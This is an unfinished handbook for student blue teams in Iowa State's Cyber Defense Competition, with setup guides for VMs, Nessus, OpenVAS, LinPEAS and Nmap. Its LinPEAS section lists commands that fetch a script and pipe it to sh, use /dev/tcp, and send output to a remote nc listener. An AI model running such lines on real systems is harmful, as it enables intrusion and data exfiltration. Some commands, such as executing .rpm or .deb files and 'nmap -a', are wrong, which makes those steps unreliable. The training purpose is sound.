# ISU CDC Handbook
### Guides, tutorials, and reference material to help you prepare and conquer the Cyber Defense Competition at Iowa State University.
---
# Table of Contents
- [What to Expect](#what-to-expect)
  - [What is the CDC](#what-is-the-cdc)
  - [Rules of Engagement](#rules-of-engagement)
  - [Scenarios and Anomalies](#scenarios-and-anomalies)
  - [Red team, Fire Drills, and Social Engineering](#red-team-fire-drills-and-social-engineering)
  - [Competition Network and Environment](#competition-network-and-environment)
- [Before the Competition](#before-the-competition)
  - [Team Formation and Registration](#team-formation-and-registration)
  - [Planning a Playbook and Basic Triaging](#planning-a-playbook-and-basic-triaging)
  - [Creating a Practice Network](#creating-a-practice-network)
  - [What to Practice](#what-to-practice)
- [Preparing for the Competition](#preparing-for-the-competition)
  - [Scanning for vulnerabilities](#scanning-for-vulnerabilities)
  - [Changing Default Passwords](#changing-default-passwords)
  - [Configuring Active Directory](#configuring-active-directory)
  - [Configuring a Database](#configuring-a-database)
  - [Configuring a Firewall](#configuring-a-firewall)
  - [Configuring VLAN](#configuring-vlan)
  - [Configuring an Intrusion Detection System](#configuring-an-intrusion-detection-system)
  - [Port Scanning](#port-scanning)
  - [System Hardening  for Linux](#system-hardening-for-linux)
  - [System Hardening for Windows](#system-hardening-for-windows)
  - [System Hardening for Custom Applications](#system-hardening-for-custom-applications)
- [Attack Phase of the Competition](#attack-phase-of-the-competition)
  - [Signs of an Attack](#signs-of-an-attack)
  - [Sniffing Network Traffic](#sniffing-network-traffic)
  - [Understanding Windows Event Viewer](#understanding-windows-event-viewer)
  - [Analyzing logs](#analyzing-logs)
  - [Identifying Malicious Processes](#identifying-malicious-processes)
  - [Isolating an Affected Machine](#isolating-an-affected-machine)
  - 

---
 # What to Expect
---
## What is the CDC
The Cyber Defense Competition is a competition hosted by Iowa State university that is designed to give students a practical, educational experience that simulate the challenges faced within incident response efforts in cyber security. Each team is assembled of four to eight players and assume the role of the Blue Team and are assigned vulnerable machines. The teams must defend against the Red Team, which represents network attackers and are industry professionals from within the area. The machines are released to the students typically at noon the day before the competition and have until 8:00 am before the attack phase begins. From 8:00 am to 4:00 pm the teams must defend against the red team and keep their services up and running to avoid losing points. The White Team supervises the event, evaluates, and assigns points to each Blue Team based on the assessments from the Red and Green Teams. The Green Team embodies typical network users, contributing to the complexity of maintaining network security. The Blue Team that accumulates the highest score by the competition's conclusion will be declared the victor. For additional details, refer to https://cdc.iseage.org/ or https://cdc.pizza/ for details on the next CDC.

## Rules of Engagement
For more details on the rules of engagement please visit https://docs.iseage.org/rules/v4.1/rules/index.html#blue-teams 
1. Blue Teams must avoid engaging in offensive behavior when defending against red team.
2. Blue Team members should refrain from sharing CDC credentials.
3. Any software or program used must be open-source or provided by ISEAGE (free-trials on paid services are allowed).
5. Access requirements for servers must be followed in order to receive points.
6. Blue Teams must follow account management guidelines and only change user passwords with authorization.
7. Submissions for usability checks and anomalies must be submitted before the dealine to receive points.
8. Blue team must not be composed of 8 or more players
9. Blue team must cooperate with white team requests


## Scenarios and Anomalies
The CDCs scenarios vary but usuallly include an active directory server, a database, a web application, a client, an application that connects to the database, and some sort of custom application. Over the years the versions of operating systems have  changed but typically use a combination of older Ubuntu versions such as 16, 20.04, as well as Alma 8 or 9, Windows 10 and Windows Server 16. Moreover, throughout the attack phase the green team leader releases anomolies which consists of a variety of tasks that teams can complete for additional points

## Red Team, Fire Drills, and Social Engineering
The red team will use a variety of techniques to take down blue team flags including traditional means of running scripts or tools against the machines as well as nontraditional means such as social engineering. Green team memebers as the end users must be able to access and interact with services and red team may attempt to impersonate the green team in attempt to gain leverage over their machines. Moreover, some red team members have used other creative means such as claiming they are a photographer taking pictures for the CDC event and end up stealing credentials. Blue teams must be prepared to handle any attack thrown at them as well as firedrills; once a firedrill is announced the blue teams must leave their computers as they are and exit the room. The red team at most can tap the space bar or wiggle a mouse but are not allowed go through or attack blue team members' personal devices.



---
# Before the Competition
---
## Team Formation and Registration
Teams should register at blue team at https://signup.iseage.org/ 
<img src="https://i.imgur.com/yUPDzTZ.png" width="703" height="373">

Be sure to rememember your credentials as they are necessary for accessing the network
<img src="https://i.imgur.com/HFkKrIP.png" width="708" height="445">

Create or join a team of up to eight players.

## Competition Network and Environment

After registering, the network can be accessed at https://vcenter.iseage.org/ be sure you are connected CDC network otherwise you will not be able to access the server.
<br>
 <img src="https://i.imgur.com/Grft5nU.png" width="697" height="297.5">
 
 Upon logging in your machines should be visable within the left panel. 
  <img src="https://i.imgur.com/G9W8mRu.png" width="697" height="297.5">

  To open your virtual machine you must first turn on the machine by clicking the "Power On" play button
  <img src="https://i.imgur.com/zBYkRnO.png">
  
  Then launch the virtual machine by click the "Launch Console" button
  <img src="https://i.imgur.com/pnc2dOG.png">

  Select Web Console and hit launch to open the machine in a new tab within your browser
  <img src="https://i.imgur.com/xG0guhG.png">
 
## Planning a Playbook and Basic Triaging
## Creating a Practice Network
Practice makes perfect and nothing beats having your very own network to test out what you'll learn. Before you get started you will need to download a few applications; a hyper visor and a few ISO files. A hypervisor is the platform that will run your virtualized network enviroment and an ISO file is often the format of choice for distributing operating systems. Below are some resources to get started, check with your school as some insitutions offer vmware or windows license to students for free. For this example we will be using Vmware Workstation since the competition uses Vmware products to host the virtual network. Simply navigate to the download link, and follow the wizard for installation. This tutorial will focus on teaching you how to get your network up and running.
1. Install hypervisor of your choice
  
   - [Vmware Workstation](https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html.html.html)  &nbsp;  <img src="https://static.wikia.nocookie.net/logopedia/images/6/62/VMware_Workstation_7_logo.png/revision/latest?cb=20140525014047" width="40" height="40">
     - 30 day free trial
        <br>
        
   - [VirtualBox](https://www.virtualbox.org/wiki/Downloads) &nbsp; <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d5/Virtualbox_logo.png/330px-Virtualbox_logo.png" width="50" height="50">
     - Free
      
   - [HyperV](https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v) &nbsp; <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5f/Windows_logo_-_2012.svg/2048px-Windows_logo_-_2012.svg.png" width="40" height="40">
     - Windows license required

2. Download ISO files 

   Essentials:
    - Ubuntu:
      - [Server ISO Download](https://ubuntu.com/download/alternative-downloads#other-images-and-mirrors)
      - [Desktop ISO Download](https://ubuntu.com/download/alternative-downloads)
    - Windows:
      - [Windows Server 2016 Evaluation ISO Download](https://www.microsoft.com/en-us/evalcenter/download-windows-server-2016)
      - [Windows 10 Evaluation ISO Download](https://info.microsoft.com/ww-landing-windows-10-enterprise.html) (Requires registration)
      
   Additional:
    - Alma
      - [ISO Download](https://mirrors.almalinux.org/isos.html)
    - Pfsense
      - [ISO Download](https://www.pfsense.org/download/)
    - Kali
      - [ISO Download](https://www.kali.org/get-kali/#kali-installer-images)
    - Security Onion
      - [ISO Download](https://download.securityonion.net/file/securityonion/securityonion-2.4.60-20240320.iso)
              <br>
      <br>

4. Create Virtual Machines
      <br>
Open Workstation and navigate to "File > New Virtual Machine" or click "ctrl + N"
  <img src="https://i.imgur.com/mHI6E7e.png">
  Select typical and click "Next"
  <img src="https://i.imgur.com/13YSA4M.png">
  Click browse and select the ISO file you downloaded
  <img src="https://i.imgur.com/mJgeZDf.png">
  Navigate through the wizard by creating a user account and appropriately name the host
  <img src="https://i.imgur.com/2v063EI.png">
  The default 20 GB should be enough for your machine
  <img src="https://i.imgur.com/Mb2hSO1.png">
   Confirm all the information is correct and click "finish"
  <img src="https://i.imgur.com/pSxO2aT.png">
  Follow the installation wizard to finish setting up the machine
  <img src="https://i.imgur.com/DXxqPK3.png" width="639" height="401">
  
## What to Practice
---
# Preparing for the Competition

## Scanning for Vulnerabilities
There a variety tools available for you to use that can streamline the process of hunting for vulnerabilities.

### Nessus
Nessus is an enterprise tool that is quite reputable and is widely used within the industry. Nessus offers a free 30 day trial on their popular vulnerability scanner. It's limited compared to the commercial version but still provides valuable vulnerability scanning capabilities. Visit https://www.tenable.com/downloads/nessus?loginAttempted=true to download you have the option to choose from a preformatted virtual machine file or download the file directly to the host.


1. Run the Installer
  For Windows:
  -  Double-click the downloaded .exe file and follow the on-screen instructions.
    
  For Linux:
  -  Open a terminal, navigate to the download directory, and run the following commands:

    sudo chmod +x Nessus-*.rpm (or .deb)
   
    sudo ./Nessus-*.rpm (or .deb


2. Start the Nessus Service

  On Windows:
  -   the Nessus service should start automatically after installation.
    
  On Linux:
  -  start the Nessus service with the following command:
    
    sudo /etc/init.d/nessusd start

3. Open a web browser and go to https://localhost:8834
4. Follow the on-screen instructions to register your Nessus installation and activate your license.
5. After activation, you will be prompted to create an admin user account.
6. Provide a username and password, then click "Submit".
7. Log in to the Nessus web interface using the admin account you just created.
8.  Click "Scans" in the left-hand menu, then click "New Scan" to create a new scan.
9.   Configure the scan settings as needed, then click "Launch Scan" to begin the vulnerability assessment.




### OpenVAS
OpenVAS is a comprehensive vulnerability scanning tool that detects security issues in your network and provides solutions to address them. It's open-source and offers a wide range of features navigate to https://www.greenbone.net/en/testnow/#toggle-id-1 to begin downloading.

1. Download the OVA file of the Greenbone Enterprise TRIAL.
2. Launch Vmware
4. In Vmware select File > Open… in the menu bar
5. Select the OVA file of the appliance in the file system.
  <img src="https://www.greenbone.net/wp-content/uploads/Import_VMware_1.png">
6. Click import
7. Login with the default credentials
   
   `username: admin`

   `password: admin`
   
  <img src="https://www.greenbone.net/wp-content/uploads/First_Setup_Wizard_1.png" width="539" height="301">

8. Select Yes and press Enter to open the Wizard.
9. Select Yes and press Enter.
10. Enter the user name of the web administrator.
  <img src="https://www.greenbone.net/wp-content/uploads/First_Setup_Wizard_2.png">

12. Enter the password of the web administrator twice.
13. Select OK and press Enter.
    
    `→ The editor is opened.`
    
14. Press Enter to close the message.
<img src="https://www.greenbone.net/wp-content/uploads/First_Setup_Wizard_3.png" width="539" height="301">

16. Select Editor and press Enter.
17. Enter the subscription key.
18. Press ctrl + X.
19. Press Y to save the changes.
20. Press Enter.
<img src="https://www.greenbone.net/wp-content/uploads/First_Setup_Wizard_4.png">

22. The web interface can be accessed by opening the web browser.
23. Enter the IP address of the appliance’s web interface.
    
         Note: The IP address of the appliance’ s web interface can be displayed as follows:
        During the login to the GOS administration menu
        By selecting About and pressing Enter in the GOS administration menu
    
24. Log in with the web administrator created during setup.
    
        → The web interface is opened.

<img src="https://www.greenbone.net/wp-content/uploads/Main_Dashboard_EN.png" width="539" height="301">

### Linpeas
LinPEAS is not specifically a vulnerability scanner in the traditional sense, but rather a tool for identifying potential security weaknesses and paths to escalate privileges on Linux systems. It can be useful for incident response by providing you with information of vulnerable or weak areas to patch or secure.

 From github

    curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

 Without curl
  
    python -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"

    python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"

 Local network

    sudo python3 -m http.server 80 #Host
    curl 10.10.10.10/linpeas.sh | sh #Victim

 Without curl

    sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
    cat < /dev/tcp/10.10.10.10/80 | sh #Victim

Excute from memory and send output back to the host

    nc -lvnp 9002 | tee linpeas.out #Host
    curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim

Use a linpeas binary

    wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
    chmod +x linpeas_linux_amd64
    ./linpeas_linux_amd64

## Changing Default Passwords
One of the most important tasks to take care upon first receiving your machines is to change all default passwords to the hosts on your network.

### Windows
Enter Ctrl+Alt+Delete and click change a password

<img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fhelp.sentrian.com.au%2Fwp-content%2Fuploads%2F2018%2F08%2Fclt-alt-del-winserver16-1.jpg&f=1&nofb=1&ipt=5b318dce91056915c4e99c1904c0e216d89925c30a05e008b14ddc8c429035ea&ipo=images">

Choose a new and secure password unique to this host 

<img src="https://kb.mlml.sjsu.edu/uploads/images/gallery/2019-02-Feb/scaled-840-0/image-1550688271601.png">

### Linux
Open a terminal and type the following command
      
      passwd

You will be prompt to enter your current password followed by being asked to enter a new password
<img src="https://itslinuxfoss.com/wp-content/uploads/2023/02/image-995.png">

## Configuring Active Directory
## Configuring a Database
## Configuring a Firewall
## Configuring VLAN
## Configuring an Intrusion Detection System
## Port Scanning
Nmap is a tool that allows you to view what ports are open and exposed to the internet. This information is vital to an attacker as it can provde insight on how to gain foothold on your network . Mitigation tactics include hiding the hosts behind a firewall. A firewall is a security system that monitors and controls incoming and outgoing network traffic based on predefined security rules. One of the key functions of a firewall is to protect a network or system by blocking unauthorized access to certain ports and services. We will dive into setting this up later.

Installation for Windows:
Download Nmap Visit the official Nmap website: https://nmap.org/download.html

Installation for Linux: 

    sudo apt-get update
    sudo apt-get install nmap

The only command you will likely need is nmap -a followed by either the host ip or ip range, this yeilds a detailed scan of the ports and services running on the machine.

    nmap -a XX.XX.XX.XX
    
## System Hardening for Linux
## System Hardening for Windows
---
# Attack Phase of the Competition
## Signs of an Attack
## Sniffing Network Traffic
## Understanding Windows Event Viewer
## Analyzing logs
## Identifying Malicious Processes
## Isolating an Affected Machine



